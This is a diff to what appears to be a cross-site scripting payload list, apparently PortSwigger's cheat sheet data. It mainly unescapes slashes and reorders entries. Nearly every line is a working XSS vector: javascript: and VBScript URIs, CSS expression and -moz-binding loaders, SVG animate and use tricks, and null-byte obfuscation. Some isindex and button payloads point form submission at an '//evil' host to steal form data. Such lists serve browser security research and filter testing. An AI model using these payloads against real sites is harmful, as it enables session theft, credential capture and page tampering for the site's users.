@@ -1,36 +1,42 @@
 <img src=\"javascript:alert(1)\">
 <body background=\"javascript:alert(1)\">
-<iframe src=\"data:text\/html,<img src=1 onerror=alert(document.domain)>\">
-<a href=\"vbscript:MsgBox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS<\/a>\n<a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS<\/a>
-<a href=\"#\" onclick=\"jscript.compact:alert(1);\">test<\/a>\n<a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test<\/a>
-<a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS<\/a>\n<a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS<\/a>
+<iframe src=\"data:text/html,<img src=1 onerror=alert(document.domain)>\">
+<a href=\"vbscript:MsgBox+1\">XSS</a>\n<a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS</a>\n<a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS</a>\n<a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS</a>\n<a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS</a>\n<a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS</a>
+<a href=\"#\" onclick=\"jscript.compact:alert(1);\">test</a>\n<a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test</a>
+<a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>\n<a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>
 <iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>\n<iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>
-<a title=\"&{alert(1)}\">XSS<\/a>
-<link href=\"xss.js\" rel=stylesheet type=\"text\/javascript\">
+<a title=\"&{alert(1)}\">XSS</a>
+<link href=\"xss.js\" rel=stylesheet type=\"text/javascript\">
 <form><button name=x formaction=x><b>stealme
-<form action=x><button>XSS<\/button><select name=x><option><plaintext><script>token=\"supersecret\"<\/script>
-<div style=\"-moz-binding:url(\/\/businessinfo.co.uk\/labs\/xbl\/xbl.xml#xss)\">\n<div style=\"\\-\\mo\\z-binding:url(\/\/businessinfo.co.uk\/labs\/xbl\/xbl.xml#xss)\">\n<div style=\"-moz-bindin\\67:url(\/\/businessinfo.co.uk\/lab s\/xbl\/xbl.xml#xss)\">\n<div style=\"-moz-bindin&#x5c;67:url(\/\/businessinfo.co.uk\/lab s\/xbl\/xbl.xml#xss)\">
-<img src=\"blah\" style=\"-moz-binding: url(data:text\/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A\/\/www.mozilla.org\/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C\/constructor%3E%3C\/implementation%3E%3C\/ binding%3E%3C\/bindings%3E)\" \/>
+<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=\"supersecret\"</script>
+<div style=\"-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\">\n<div style=\"\\-\\mo\\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\">\n<div style=\"-moz-bindin\\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\">\n<div style=\"-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\">
+<img src=\"blah\" style=\"-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)\" />
 <div style=xss:expression(alert(1))>\n<div style=xss:expression(1)-alert(1)>\n<div style=xss:expressio\\6e(alert(1))>\n<div style=xss:expressio\\006e(alert(1))>\n<div style=xss:expressio\\00006e(alert(1))>\n<div style=xss:expressio\\6e(alert(1))>\n<div style=xss:expressio&#x5c;6e(alert(1))>
-<div style=xss=expression(alert(1))>\n<div style=\"color&#x3dred\">test<\/div>
-<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS<\/a>
-<script>\nfunction window.onload(){\nalert(1);\n}\n<\/script>\n<script>\nfunction window::onload(){\nalert(1);\n}\n<\/script>\n<script>\nfunction window.location(){\n}\n<\/script>\n<body>\n<script>\nfunction\/*<img src=1 onerror=alert(1)>*\/document.body.innerHTML(){}\n<\/script>\n<\/body>\n<body>\n<script>\nfunction document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; }\n<\/script>\n<\/body>
-<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> <\/BODY><\/HTML>
-<a href=\"javascript&\u0000#x6a;avascript:alert(1)\">Firefox<\/a>
-<a href=\"javascript&\u0000colon\u0000;alert(1)\">Firefox<\/a>
-<!-\u0000- ><img title=\"--><iframe\/onload=alert(1)>\"> -->\n<!-\u0000\u0000\u0000\u0000\u0000- ><img title=\"--><iframe\/onload=alert(1)>\"> -->
+<div style=xss=expression(alert(1))>\n<div style=\"color&#x3dred\">test</div>
+<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS</a>
+<script>\nfunction window.onload(){\nalert(1);\n}\n</script>\n<script>\nfunction window::onload(){\nalert(1);\n}\n</script>\n<script>\nfunction window.location(){\n}\n</script>\n<body>\n<script>\nfunction/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}\n</script>\n</body>\n<body>\n<script>\nfunction document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; }\n</script>\n</body>
+<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> </BODY></HTML>
+<a href=\"javascript&\u0000#x6a;avascript:alert(1)\">Firefox</a>
+<a href=\"javascript&\u0000colon\u0000;alert(1)\">Firefox</a>
+<!-\u0000- ><img title=\"--><iframe/onload=alert(1)>\"> -->\n<!-\u0000\u0000\u0000\u0000\u0000- ><img title=\"--><iframe/onload=alert(1)>\"> -->
 <svg><xss onload=alert(1)>
-<isindex type=image src=\"\/\/evil?
-<isindex type=submit style=width:100%;height:100%; value=XSS formaction=\"\/\/evil?
+<isindex type=image src=\"//evil?
+<isindex type=submit style=width:100%;height:100%; value=XSS formaction=\"//evil?
 <isindex type=submit formaction=javascript:alert(1)>
 <isindex type=submit action=javascript:alert(1)>
 <svg><discard onbegin=alert(1)>
 <svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>
 <img src=validimage.png onloadstart=alert(1)>
 <input type=image onloadend=alert(1) src=validimage.png>
-<marquee width=1 loop=1 onbounce=alert(1)>XSS<\/marquee>
-<marquee width=1 loop=1 onfinish=alert(1)>XSS<\/marquee>
-<marquee onstart=alert(1)>XSS<\/marquee>
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
+<marquee onstart=alert(1)>XSS</marquee>
+<script>location.protocol='javascript'</script>
+<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test</a>
+<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x\" /></svg>
+<svg><use href=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" />
+<a href=\"javascript://%0aalert(1)\">XSS</a>
+<base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>
 <script>alert(document.domain)<\/script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
@@ -989,36 +995,30 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <iframe src=\"javascript:alert(1)\">
 <object data=\"javascript:alert(1)\">
 <embed src=\"javascript:alert(1)\">
-<a href=\"javascript:alert(1)\">XSS<\/a>
-<a href=\"JaVaScript:alert(1)\">XSS<\/a>
-<a href=\" \tjavascript:alert(1)\">XSS<\/a>
-<a href=\"javas\tcript:alert(1)\">XSS<\/a>
-<a href=\"javascript\n:alert(1)\">XSS<\/a>
-<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS<\/text><\/a>
-<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>
-<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>
-<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>
-<script src=\"data:text\/javascript,alert(1)\"><\/script>
-<svg><script href=\"data:text\/javascript,alert(1)\" \/>
-<svg><use href=\"data:image\/svg+xml,<svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg' xmlns:xlink='http:\/\/www.w3.org\/1999\/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' \/><\/a><\/svg>#x\"><\/use><\/svg>
-<script>import('data:text\/javascript,alert(1)')<\/script>
-<base href=\"javascript:\/a\/-alert(1)\/\/\/\/\/\/\/\"><a href=..\/lol\/safari.html>test<\/a>
+<a href=\"javascript:alert(1)\">XSS</a>
+<a href=\"JaVaScript:alert(1)\">XSS</a>
+<a href=\" \tjavascript:alert(1)\">XSS</a>
+<a href=\"javas\tcript:alert(1)\">XSS</a>
+<a href=\"javascript\n:alert(1)\">XSS</a>
+<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<script src=\"data:text/javascript,alert(1)\"></script>
+<svg><script href=\"data:text/javascript,alert(1)\" />
+<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>
+<script>import('data:text/javascript,alert(1)')</script>
 <math><x href=\"javascript:alert(1)\">blah
 <form><button formaction=javascript:alert(1)>XSS
 <form><input type=submit formaction=javascript:alert(1) value=XSS>
 <form action=javascript:alert(1)><input type=submit value=XSS>
-<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS<\/text><\/a>
-<a href=\"javascript:\/\/%0aalert(1)\">XSS<\/a>
-<svg><use href=\"data:image\/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x\" \/><\/svg>
-<svg><use href=\"data:image\/svg+xml,&lt;svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg'&gt;&lt;image href='1' onerror='alert(1)' \/&gt;&lt;\/svg&gt;#x\" />
-<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image\/svg+xml,&lt;svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg'&gt;&lt;image href='1' onerror='alert(1)' \/&gt;&lt;\/svg&gt;#x\" \/><use id=x \/>
+<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />
 <embed code=https://portswigger-labs.net width=500 height=500 type=text/html>
 <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
-<script>location.protocol='javascript'<\/script>
-<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test<\/a>
 <script>navigation.navigate('javascript:alert(1)')</script>
 <script>onerror=alert;throw 1</script>
 <script>{onerror=alert}throw 1</script>
